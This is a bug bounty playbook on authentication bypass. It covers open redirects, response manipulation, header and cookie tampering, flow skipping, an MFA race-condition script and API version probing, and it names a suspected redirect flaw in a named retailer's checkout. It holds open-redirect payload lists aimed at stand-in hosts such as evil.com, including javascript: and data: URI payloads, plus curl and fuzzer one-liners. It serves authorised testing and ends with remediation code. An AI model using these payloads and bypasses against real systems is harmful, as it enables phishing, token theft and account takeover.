# Authentication Bypass Playbook

**Category:** Authentication / Access Control
**Typical Severity:** Medium–Critical
**CVSS Range:** 5.3–9.8
**CWE:** CWE-287 (Improper Authentication), CWE-601 (Open Redirect)

---

## Overview

Authentication bypass vulnerabilities allow attackers to access protected functionality or data without valid credentials. In modern bug bounty programs, these range from complete authentication skips to partial bypasses that leak sensitive post-auth state. Common patterns:

1. **Open redirects in auth/payment flows** — `returnUrl` parameters redirect victims post-auth to attacker-controlled sites
2. **Response manipulation** — changing `{"success": false}` to `true` in proxy intercept
3. **Header-based auth bypass** — `X-Original-URL: /admin`, `X-Rewrite-URL`, `Referer` spoofing
4. **State/flow skipping** — accessing step 3 of a multi-step flow without completing steps 1–2
5. **Cookie/parameter manipulation** — changing `role=user` to `admin`, `debug=0` to `1`
6. **MFA bypass** — race conditions in MFA enrollment, response manipulation after MFA check
7. **JWT-based bypass** — see `jwt.md`
8. **OAuth flow vulnerabilities** — `redirect_uri` manipulation, `state` parameter bypass

---

## Real-World Impact

- **Phishing amplification**: Open redirects on trusted domains increase phishing success dramatically
- **Token theft**: Post-auth redirects carry access tokens in URL fragments
- **Account takeover**: Redirect after password reset/OAuth callback to attacker page
- **Payment fraud**: Redirect after successful payment to fake "order confirmation" page
- **Admin panel access**: Header-based path bypass to reach restricted URLs
- **MFA bypass → ATO**: Race condition in 2FA enrollment → skip verification entirely

---

## Recon Methodology

### Step 1 — Find redirect parameters

```bash
# Common parameter names that control redirects
params="returnUrl|return_url|returnTo|redirect|redirect_uri|next|continue|
        successUrl|cancelUrl|callbackUrl|dest|destination|url|target|redir"

# Find in JS bundles
curl -s "https://target.com/app.js" | grep -oE "(returnUrl|redirect|next|continue)=[^&\"']+"

# Find in source
curl -s "https://target.com/login" | grep -oE "(action|href)=\"[^\"]*\?[^\"]*\""
```

### Step 2 — Map all authentication flows

Identify every multi-step flow:
- Login → dashboard
- Password reset → login
- OAuth callback → home
- Payment → order confirmation
- MFA enrollment → authenticated session
- Email verification → account activation

### Step 3 — Look for response-based auth signals

```bash
# Capture the exact response when auth fails vs succeeds
# Look for JSON patterns like:
# {"status": "error"} vs {"status": "ok"}
# {"authenticated": false} vs {"authenticated": true}
# HTTP 302 to /login (fail) vs HTTP 302 to /dashboard (success)
# These are candidates for response manipulation
```

---

## Testing Methodology

### Test 1 — Open Redirect

```bash
# Test login redirect
curl -si "https://target.com/login?returnUrl=https://attacker.com" -L

# Test payment flow
curl -si "https://target.com/checkout?successUrl=https://attacker.com"

# Protocol-relative (bypasses http/https-only filters)
-H "Origin: //evil.com"
?next=//evil.com
?next=\/\/evil.com

# Subdomain trust bypass
?return=https://evil.target.com
?return=https://target.com.evil.com

# Payload list
https://evil.com
//evil.com
\/\/evil.com
%2F%2Fevil.com
https://target.com@evil.com
https://evil.com#target.com
javascript:window.location='https://evil.com'
data:text/html,<script>window.location='https://evil.com'</script>
```

### Test 2 — Response Manipulation (Burp Proxy)

```bash
# Intercept the authentication response in Burp
# Change: {"success": false, "message": "Invalid code"}
# To:     {"success": true}

# Change: HTTP 302 Location: /login?error=invalid_otp
# To:     HTTP 302 Location: /dashboard

# Change: {"authenticated": false}
# To:     {"authenticated": true}

# Also try modifying HTTP status code:
# 401 → 200
# 403 → 200
```

### Test 3 — Header-Based Path Bypass

```bash
# Override the URL the server processes via headers
curl "https://target.com/index.html" \
  -H "X-Original-URL: /admin/dashboard"

curl "https://target.com/index.html" \
  -H "X-Rewrite-URL: /admin/users"

# Referer-based access control bypass
curl "https://target.com/admin/users" \
  -H "Referer: https://target.com/admin"

# Debug mode bypass
curl "https://target.com/admin" \
  -H "X-Debug: true" \
  -H "X-Debug-Token: 1"
```

### Test 4 — Cookie/Parameter Manipulation

```bash
# Decode and modify JWT or base64-encoded cookies
echo "eyJ1c2VyX3JvbGUiOiJ1c2VyIn0=" | base64 -d
# {"user_role":"user"}

# Re-encode with modified value
echo '{"user_role":"admin"}' | base64
# Resubmit with modified cookie

# Common cookie names to test
role=admin
is_admin=1
debug=1
user_type=admin
account_type=premium
```

### Test 5 — Flow Step Bypass

```bash
# Try accessing password reset step 2 without completing step 1
# Step 1: POST /auth/forgot-password (sends email)
# Step 2: POST /auth/reset-password?token=xxx (uses token)
# Test: Skip step 1, attempt step 2 directly with a guessable token

# Multi-step checkout bypass
# Step 1: Add item to cart
# Step 2: Enter shipping info
# Step 3: Enter payment
# Test: Access /checkout/confirm directly (step 3) without steps 1-2
curl "https://target.com/checkout/confirm" \
  -H "Cookie: session=<your_session>"
```

### Test 6 — MFA Race Condition

```bash
# MFA enrollment race condition
# Trigger MFA setup for account
# Immediately send two parallel requests:
# 1. Continue with MFA setup (normal path)
# 2. Access authenticated content (race condition)

python3 -c "
import threading, requests

s = requests.Session()
s.post('https://target.com/auth/login', json={'email':'you@test.com','password':'correct'})

def access_protected():
    r = s.get('https://target.com/dashboard')
    print(f'Protected: {r.status_code}')

def setup_mfa():
    r = s.post('https://target.com/auth/setup-mfa')
    print(f'MFA setup: {r.status_code}')

t1 = threading.Thread(target=access_protected)
t2 = threading.Thread(target=setup_mfa)
t1.start(); t2.start()
t1.join(); t2.join()
"
```

### Test 7 — API Versioning Bypass

```bash
# Older API versions sometimes lack auth checks that newer versions have
curl "https://api.target.com/v1/admin/users" -H "Authorization: Bearer <user_token>"
curl "https://api.target.com/v2/admin/users" -H "Authorization: Bearer <user_token>"
curl "https://api.target.com/beta/admin/users" -H "Authorization: Bearer <user_token>"
curl "https://api.target.com/internal/admin/users" -H "Authorization: Bearer <user_token>"
```

---

## Common Endpoints to Test

| Endpoint Pattern | Auth Bypass Vector |
|---|---|
| `/login?next=`, `/login?returnUrl=` | Open redirect post-login |
| `/logout?redirect=` | Open redirect post-logout |
| `/reset-password` | Multi-step flow skip, token brute force |
| `/checkout/payment?successUrl=` | Post-payment redirect |
| `/oauth/callback?redirect_uri=` | OAuth redirect URI manipulation |
| `/verify-email?token=` | Weak/guessable token |
| `/admin/*` | Header bypass (X-Original-URL), direct access |
| `/api/v1/*` | Check v2/beta/internal equivalents |
| MFA enrollment flow | Race condition |
| Password reset flow | Response manipulation |

---

## Payload Examples

### Open Redirect Payload List

```
https://evil.com
http://evil.com
//evil.com
\/\/evil.com
/\/evil.com
%2F%2Fevil.com
%5C%5Cevil.com
https://target.com@evil.com
https://evil.com#target.com
https://evil.com?target.com
javascript:window.location='https://evil.com'
data:text/html,<script>window.location='https://evil.com'</script>
```

### OAuth Redirect URI Bypass

```
# Registered: https://target.com/callback
# Test:
https://target.com/callback/../../../evil.com
https://target.com.evil.com/callback
https://target.com/callback?redirect=https://evil.com
```

### JavaScript Source Analysis (find client-side redirects)

```bash
# Search for window.location usage with parameters
curl -s "https://target.com/bundle.js" | \
  grep -oE "window\.location\.(href|replace)\s*=\s*[^;]+" | head -20

# Look for returnUrl in JavaScript
curl -s "https://target.com/bundle.js" | \
  grep -oE "(returnUrl|returnURL|return_url|redirectUrl)[^,;]+"
```

---

## Automation Ideas

```bash
# Open redirect fuzzer (gf + qsreplace)
cat urls.txt | gf redirect | qsreplace "https://evil.com" | \
  httpx -follow-redirects -match-string "evil.com" -silent

# Autorize (Burp extension) — re-tests all requests with lower-privilege session
# Catches both IDOR and auth bypass simultaneously

# Nuclei auth bypass templates
nuclei -u https://target.com -t auth-bypass/ -H "Authorization: Bearer <token>"

# Match and Replace rules in Burp:
# Rule 1: Response body: "false" → "true"
# Rule 2: Response body: "\"role\":\"user\"" → "\"role\":\"admin\""
```

---

## Real Bug Bounty Examples

### Example 1 — Tesla ($10,000) — Gemini Research
MFA bypass via response manipulation. After submitting a wrong MFA code, the server returned `{"success": false}`. Changing it to `{"success": true}` in Burp Proxy granted full authenticated access — the frontend trusted the response body rather than the server validating the code server-side.

### Example 2 — Zoom ($10,000)
Numeric meeting password brute force — no rate limit on a specific API endpoint (`/v1/meetings/join`) while the main UI was rate-limited. Meeting password space is typically 6 digits.

### Example 3 — GitHub ($20,000+)
Logic flaw in SAML implementation — the signature validation happened before XML parsing, but the signed element was identified by a reference URI that could be manipulated to point to an attacker-controlled element.

---

## Lab / Program Examples

### Boozt Fashion AB — Unvalidated returnUrl in Payment Flow (2026-03-11)

**Report:** `~/BugBounty/hackerone/boozt/findings/FINDING-003-payment-returnurl-unvalidated-redirect.md`
**Severity:** Medium (estimated — requires auth to fully verify)

**Finding:** JavaScript bundle analysis of the Boozt checkout frontend reveals that a `returnUrl` parameter is passed directly to `window.location.href` on both payment success and payment error callbacks in the kronor.io payment SDK:

```javascript
onSuccess: () => {
    window.location.href = j  // j = returnUrl — no validation
},
onError: async r => {
    window.location.href = j  // same on failure
}
```

**Attack scenario:** If the server-side payment session creation API accepts a user-supplied `returnUrl` without validating it against an allowlist, an attacker can redirect victims to a phishing page immediately after completing a legitimate payment. The timing (immediately post-payment) and trusted origin (boozt.com redirect) make this a high-confidence phishing vector.

**Evidence:** `https://assets2.booztcdn.com/assets/components/shopboozt.common.fbd3435fa1d402436ec3.bundle.js`

**Status:** Needs manual verification — the client-side code is confirmed, server-side validation unknown.

---

## Remediation

```python
# Allowlist validation (Python)
ALLOWED_REDIRECT_HOSTS = {'www.target.com', 'target.com', 'app.target.com'}

def validate_redirect(url):
    from urllib.parse import urlparse
    parsed = urlparse(url)
    if parsed.netloc not in ALLOWED_REDIRECT_HOSTS:
        return '/dashboard'  # safe fallback
    return url

# For MFA: validate server-side, never trust response body on client
# JWT/session should only be issued AFTER server confirms OTP is valid
# Never expose the auth decision in a client-readable response body

# For response manipulation: ensure state changes happen server-side
# A 200 OK with {"success": false} should NOT grant access to protected resources
# Use session state, not response body, to track authentication status
```
